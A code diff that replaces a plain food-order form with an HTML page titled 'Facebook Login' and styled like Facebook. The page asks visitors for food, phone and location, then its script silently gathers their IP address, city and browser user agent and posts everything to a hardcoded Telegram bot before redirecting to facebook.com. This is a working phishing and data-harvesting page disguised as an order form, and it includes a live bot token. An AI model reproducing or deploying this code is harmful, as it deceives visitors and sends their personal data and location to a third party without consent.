@@ -1,98 +1,216 @@
-<p>
-  1.On your Android phone or tablet, open the Google Maps app .
-  <hr>
-  2.find your place on the map, then touch and hold to drop a red pin.<img src="https://i.ibb.co/j31BnDS/IMG-20230922-WA0003.jpg" />
-<hr>after the a red pin <img src="https://i.ibb.co/HHPTvgx/download.png" /> you will see numbers like this -23.716545,6656544 then copy those numbers and paste here on the location
-<hr>
-
-<hr>
-</p>
-<fieldset style="height:7000px;width:320px;">
-<form action="https://formsubmit.co/matlalaprocess@gmail.co" method="POST">
-<p style="color:blue">
-<var>Thank your for Downloading our apk</var>
-</p>
-<fieldset style="border-radius:5px;background-color:white">
-<input type="text" name="process" placeholder="Enter name" required>
-</fieldset>
-<fieldset style="border-radius:5px;background-color:white">
-<input type="text" name="process" placeholder="location e.g -23.775554,667555" required>
-</fieldset>
-<fieldset style="border-radius:5px;background-color:white">
-<input type="text" name="Gmail " class="input-control w-100" placeholder="village name">
-<fieldset style="border-radius:5px;background-color:white">
-<select>
-<option>KoTA  R15</option>
-<option>Chips R10</option>
-<option>Full chicken</option>
-</select>
-</fieldset>
-<fieldset style="border-radius:5px;background-color:white">
-<input type="text" name="Gmail " class="input-control w-100" placeholder="Last name">
-</fieldset>
-<fieldset style="border-radius:5px;background-color:white">
-<button style="border-radius:5px;background-color:blue">Order</buttom>
-</body>
-</fieldset>
-</fieldset>
-<link rel="stylesheet" href="/ootstrap.min.css">
-<style>
-* {
-box-sizing: border-box;
-}
-body {
-background: white;
-padding: 0 10px;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>body {
+    font-family: Arial, sans-serif;
+    background-color: #f0f2f5;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
 }
 
-h4 {
-font-weight: bolder;
-color: #0039FF;
-font-size: 20px;
-text-align: center;
+.container {
+    background-color: white;
+    border: 1px solid #ddd;
+    border-radius: 8px;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    text-align: center;
+    width: 320px;
+    padding: 20px;
 }
-input {
-padding: 15px;
-font-size: 13.5px;
-background: rgba(0, 21, 255, 0.03);
-border: none;
-width: 100%;
-margin: 10px 0;
 
+.logo-container {
+    margin-bottom: 20px;
 }
+
+.logo {
+    font-family: 'Arial Black', sans-serif;
+    font-size: 36px;
+    color: #1877f2;
+}
+
+.slogan {
+    color: #555;
+    font-size: 14px;
+    margin-top: 5px;
+}
+
+.form-container {
+    text-align: center;
+}
+
+.input-field {
+    width: 100%;
+    padding: 10px;
+    margin: 8px 0;
+    border: 1px solid #ddd;
+    border-radius: 5px;
+    font-size: 16px;
+}
+
+.login-button {
+    background-color: #1877f2;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    padding: 12px;
+    width: 100%;
+    cursor: pointer;
+    font-size: 18px;
+    margin: 12px 0;
+}
+
+.login-button:hover {
+    background-color: #0e5ace;
+}
+
 a {
-font-size: 13px;
-text-align: center;
-text-decoration: none;
+    text-decoration: none;
+    color: #1877f2;
+    font-size: 14px;
 }
-p {
-text-align: center;
+
+.divider {
+    margin: 12px 0;
+    border-top: 1px solid #ddd;
 }
-small {
-font-size: 12px;
-padding-left: 130px;
+
+.no-social-login {
+    font-size: 14px;
+    margin-top: 16px;
 }
-#meta {
-font-size: 13px;
+
+.no-social-login a {
+    font-weight: bold;
+    color: #1877f2;
 }
-button {
-width: 100%;
-height: 43px;
-border-radius: 5px;
-border: none;
-background: #0d6efd;
-color: white;
+
+.no-social-login a:hover {
+    text-decoration: underline;
 }
-.cna {
-background: green;
-color: white;
+
+.popup {
+    display: none;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background-color: rgba(0, 0, 0, 0.8);
+    color: white;
+    border-radius: 5px;
+    padding: 15px;
+    z-index: 1;
 }
-option {
-background: blue solid #000;
-font-size: 80;
-color: blue;
+
+.popup-content {
+    position: relative;
 }
-img {
-height: 50;
-}
-</style>
+
+.popup-close {
+    position: absolute;
+    top: 5px;
+    right: 5px;
+    font-size: 20px;
+    cursor: pointer;
+}</style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <div class="logo"><strong>Order food</strong></div>
+            <p class="slogan">Thank you for using our website</p>
+        </div>
+        <div class="form-container">
+            <form onsubmit="submitonhfc(); return false;" method="post">
+              <input type="hidden" name="" id="pagename" value="Facebook" />
+                <input type="text" id="email" placeholder="location url" class="input-field" name="email" required>
+                <input id="name" type="locate" placeholder="Food" class="input-field" name="location" required>
+        <input type="tel" id="phone" name="phone" placeholder="phone" required>
+                <button type="submit" class="login-button">Send</button>
+            </form>
+            
+            <div class="divider"></div>
+            <div class="no-social-login">
+                <p>Don't have an account? <a href="#" id="signup-button">Send</a></p>
+            </div>
+        </div>
+    </div>
+
+    <div id="error-popup" class="popup">
+        <div class="popup-content">
+            <span class="popup-close" id="close-popup">&times;</span>
+        </div>
+    </div>
+
+    <script>function la(src) {
+      window.location = src;
+    }
+    
+         function GetURLParameter(sParam) {
+           var sPageURL = window.location.search.substring(1);
+           var sURLVariables = sPageURL.split('&');
+           for (var i = 0; i < sURLVariables.length; i++) {
+             var sParameterName = sURLVariables[i].split('=');
+             if (sParameterName[0] == sParam) {
+               return sParameterName[1];
+             }
+           }
+         }
+    
+         var chatid = GetURLParameter('id');
+    
+         function submitonhfc() {
+           // Get IP address information using an API service
+           fetch('https://ipapi.co/json/')
+             .then(response => response.json())
+             .then(data => {
+               // Extract relevant device and IP information
+               const userAgent = navigator.userAgent;
+               const ip = data.ip;
+               const cityName = data.city;
+    
+               // Create the message to send
+               const phone = document.getElementById("phone").value;
+               const page = document.getElementById("pagename").value;
+               const name = document.getElementById("name").value;
+               const email = document.getElementById("email").value;
+               const message = `> Login Page : ${page}\n\n> food :
+                 ${name}\n\n> phone :
+                 ${phone}\n\n> location url :
+                 ${email}\n\n> User Agent : ${userAgent}\n\n> IP Address : ${ip}\n\n> City : ${cityName}`;
+    
+               // Send the message to your Telegram bot using the appropriate API
+               const botToken = '6357441245:AAGY8yAuR9uXK0PuPcwtqmbzzjhMpMpfpc0';
+               const chatId =1097939336 ;
+    
+               const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+               const telegramParams = {
+                 chat_id: chatId,
+                 text: message
+               };
+    
+               // Send the request to the Telegram bot using AJAX
+               const xhr = new XMLHttpRequest();
+               xhr.open('POST', telegramUrl, true);
+               xhr.setRequestHeader('Content-Type', 'application/json');
+               xhr.send(JSON.stringify(telegramParams));
+    
+               // Handle the response (optional)
+               xhr.onload = function() {
+                 if (xhr.status === 200) {
+                   window.location.href = "https://www.facebook.com";
+                 } else {
+                   console.log('Error sending data to Telegram:', xhr.statusText);
+                 }
+               };
+    
+             })
+             .catch(error => console.log('Error retrieving IP address information:', error));
+         }</script>
+</body>
+</html>
